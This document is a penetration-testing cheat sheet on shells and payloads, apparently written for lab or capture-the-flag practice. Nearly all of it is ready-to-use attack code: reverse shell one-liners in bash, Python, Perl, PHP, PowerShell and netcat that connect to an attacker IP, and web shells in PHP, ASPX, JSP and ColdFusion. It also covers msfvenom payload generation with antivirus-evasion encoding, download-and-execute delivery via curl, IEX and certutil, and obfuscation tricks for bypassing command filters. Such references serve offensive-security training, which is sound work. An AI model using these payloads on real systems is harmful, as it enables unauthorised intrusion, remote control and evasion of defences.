# Shells & Payloads

#shells #webshells #msfvenom #payloads #ReverseShell

## Shell Types

| Type | Direction | Use case |
|------|-----------|----------|
| **Reverse shell** | Victim → Attacker | Attacker listens; victim connects back. Most common — bypasses inbound firewall rules. |
| **Bind shell** | Attacker → Victim | Victim listens; attacker connects. Useful when attacker can't receive connections. |
| **Web shell** | HTTP request → OS | Command execution through web app. Persistent but limited (no interactivity). |
| **Staged** | Two-stage delivery | Small stager downloads full payload. Smaller initial footprint. |
| **Stageless** | Single delivery | Full payload in one file. Works without internet access on target. |

---

## Listeners

### Netcat

```bash
nc -lvnp 4444

# rlwrap for arrow keys / history (Windows shells)
rlwrap nc -lvnp 4444
```

### pwncat-cs (best for Linux — auto upgrades TTY)

```bash
pip install pwncat-cs

# Listen
pwncat-cs -lp 4444

# Connect to bind shell
pwncat-cs <target-ip> 4444
```

### Metasploit multi/handler

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp    # match your payload
set LHOST tun0
set LPORT 4444
set ExitOnSession false
run -j    # run as background job, handle multiple sessions
```

---

## Linux Reverse Shells

Use [revshells.com](https://www.revshells.com/) to generate — set IP, port, shell type.

### Bash

```bash
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1

# URL-encoded (for injection contexts)
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.x%2F4444%200%3E%261%22

# From command injection
$(bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1')
```

### Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Perl

```bash
perl -e 'use Socket;$i="10.10.14.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.10.14.x",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### PHP (CLI)

```bash
php -r '$sock=fsockopen("10.10.14.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat variants

```bash
# Standard (if -e is available)
nc -e /bin/sh 10.10.14.x 4444

# mkfifo (when -e not available)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.x 4444 >/tmp/f
```

### Socat (fully interactive — best option)

```bash
# Attacker listener (fully interactive)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:4444
```

### AWK / Find / misc

```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
```

---

## Windows Reverse Shells

### PowerShell (most common)

```powershell
# Basic TCP reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/shell.ps1')"

# One-liner (no download)
powershell -nop -noni -w hidden -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.x',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded (bypass argument restrictions)
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.x/shell.ps1")'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
# Then:
powershell -ep bypass -enc <BASE64>
```

### Nishang (PowerShell reverse shell framework)

```powershell
# On attacker — serve Invoke-PowerShellTcp.ps1
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
# Add to end of file:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.x -Port 4444

# On victim
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/Invoke-PowerShellTcp.ps1')
```

### cmd.exe

```cmd
# Using nc.exe (upload first)
nc.exe -e cmd.exe 10.10.14.x 4444

# Using PowerShell to download and execute
cmd /c powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/shell.ps1')"
```

### ConPTY Shell (fully interactive Windows)

Use [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) for a fully interactive Windows shell with tab completion, colors, etc.

```powershell
# Attacker
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# Victim
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.x 4444
```

---

## TTY Upgrade (Linux)

**When:** Dumb shell (no tab completion, can't use sudo, Ctrl+C kills shell).

### Method 1: Python pty (most common)

```bash
# Step 1: Spawn PTY on victim
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or: python -c, script -qc /bin/bash /dev/null

# Step 2: Background the shell
Ctrl+Z

# Step 3: Fix terminal on attacker
stty raw -echo; fg

# Step 4: After shell resumes, set vars
export TERM=xterm
export SHELL=/bin/bash

# Step 5 (optional): Match terminal size
# On attacker: stty size → note rows/cols
# On victim:
stty rows 50 cols 220
```

### Method 2: script

```bash
script -qc /bin/bash /dev/null
# Then do Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

### Method 3: socat (fully interactive, no extra steps)

```bash
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:4444
```

---

## Web Shells

### PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo exec($_REQUEST['cmd']); ?>

# Password protected
<?php if($_GET['p']==='s3cr3t'){system($_GET['cmd']);} ?>

# POST-based (harder to detect in logs)
<?php system($_POST['cmd']); ?>
```

**phpbash** — interactive web shell: [github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)

**WhiteWinterWolf PHP webshell** — feature-rich, file manager included.

**Laudanum** — collection of web shells for multiple languages:
```bash
ls /usr/share/laudanum/
cp /usr/share/laudanum/php/php-reverse-shell.php .
# Edit LHOST/LPORT, upload, browse to trigger
```

### ASPX (.NET)

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### JSP (Java/Tomcat)

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
java.io.InputStream is = p.getInputStream();
java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
out.println(s.hasNext() ? s.next() : "");
%>
```

### Cold Fusion (CFM)

```cfm
<cfexecute name="cmd.exe" arguments="/c #url.cmd#" timeout="5" variable="output"/>
<cfoutput>#output#</cfoutput>
```

---

## msfvenom

### Staged vs Stageless

```
linux/x64/shell_reverse_tcp      → stageless (/ not //)
linux/x64/shell/reverse_tcp      → staged (// means staged)
windows/x64/meterpreter_reverse_tcp  → stageless meterpreter
windows/x64/meterpreter/reverse_tcp  → staged meterpreter
```

### Common payloads

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f elf -o shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f exe -o shell.exe

# Windows Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.x LPORT=4444 -f exe -o meter.exe

# PHP webshell
msfvenom -p php/reverse_php LHOST=10.10.14.x LPORT=4444 -f raw -o shell.php

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f aspx -o shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f war -o shell.war

# PowerShell
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f raw -o shell.ps1

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.x LPORT=4444 -f raw -o shell.py

# DLL (for DLL hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f dll -o shell.dll

# Shellcode (for injection)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f c
```

### Encoding (basic AV evasion)

```bash
# Single encode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -e x64/xor -f exe -o shell.exe

# Iteration
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -e x64/xor -i 10 -f exe -o shell.exe

# List encoders
msfvenom -l encoders
```

---

## Payload Delivery (Getting It to the Target)

### HTTP server (attacker serves files)

```bash
python3 -m http.server 80
python3 -m http.server 8080
```

### Linux download methods

```bash
wget http://10.10.14.x/shell.elf -O /tmp/shell.elf
curl http://10.10.14.x/shell.elf -o /tmp/shell.elf
curl http://10.10.14.x/shell.sh | bash    # pipe directly to bash
```

### Windows download methods

```powershell
# PowerShell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.x/shell.exe','C:\Windows\Temp\shell.exe')
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.x/shell.ps1')
Invoke-WebRequest -Uri http://10.10.14.x/shell.exe -OutFile C:\Windows\Temp\shell.exe

# certutil (built-in, LOLBin)
certutil -urlcache -split -f http://10.10.14.x/shell.exe C:\Windows\Temp\shell.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://10.10.14.x/shell.exe C:\Windows\Temp\shell.exe

# cmd curl (Windows 10+)
curl http://10.10.14.x/shell.exe -o C:\Windows\Temp\shell.exe
```

### SMB delivery (Windows)

```bash
# Attacker — host SMB share
impacket-smbserver share . -smb2support

# Victim — execute directly from UNC
\\10.10.14.x\share\shell.exe

# Or copy
copy \\10.10.14.x\share\shell.exe C:\Windows\Temp\shell.exe
```

---

## Shell Evasion / Obfuscation

### Base64 encode bash payload

```bash
echo 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQo=

bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQo=}|{base64,-d}|bash"
# Or:
bash -c "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC54LzQ0NDQgMD4mMQo= | base64 -d)"
```

### PowerShell base64

```powershell
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.x/shell.ps1")'
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
powershell -ep bypass -enc $enc
```

### IFS bypass (space filter)

```bash
IFS=,;cmd=bash,-i,>&,/dev/tcp/10.10.14.x/4444,0>&1;$cmd
```

### Variable substitution

```bash
c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
```

---

## Quick Reference Checklist

```
1. Set up listener
   - Linux target: nc -lvnp 4444
   - Linux target (better): pwncat-cs -lp 4444
   - Windows target: rlwrap nc -lvnp 4444
   - Meterpreter: msf multi/handler

2. Generate/choose shell
   - Linux: bash one-liner, python, socat
   - Windows: PowerShell one-liner, msfvenom EXE
   - Web: PHP system(), ASPX, JSP

3. Deliver payload
   - python3 -m http.server → wget/curl/IWR
   - SMB share for Windows
   - Direct injection if RCE available

4. After catching shell (Linux) — upgrade TTY
   - python3 -c 'import pty; pty.spawn("/bin/bash")'
   - Ctrl+Z → stty raw -echo; fg
   - export TERM=xterm

5. After catching shell (Windows)
   - rlwrap on listener for arrow keys
   - Migrate to stable process in meterpreter
   - ConPtyShell for fully interactive

6. Verify access
   - id / whoami
   - hostname
   - ip a / ipconfig
   - Check for docker: cat /.dockerenv
```
